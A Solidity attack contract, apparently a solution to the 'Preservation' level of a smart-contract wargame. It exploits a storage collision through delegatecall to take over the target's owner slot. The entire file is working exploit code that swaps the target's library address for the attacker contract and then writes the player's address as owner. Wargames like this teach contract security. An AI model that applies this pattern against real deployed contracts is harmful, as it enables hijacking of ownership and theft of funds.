// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IntPreservation {
    function setFirstTime(uint256 _timeStamp) external;
}

contract PreservationAttack {
    address public dummySlot1;
    address public dummySlot2;
    address public owner;

    IntPreservation public preservation;

    constructor(address _target) {
        preservation = IntPreservation(_target);
    }

    function callSetFirstTime(address _player) public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(_player)));
    }

    function setTime(uint256 _value) public {
        owner = address(uint160(_value));
    }

}
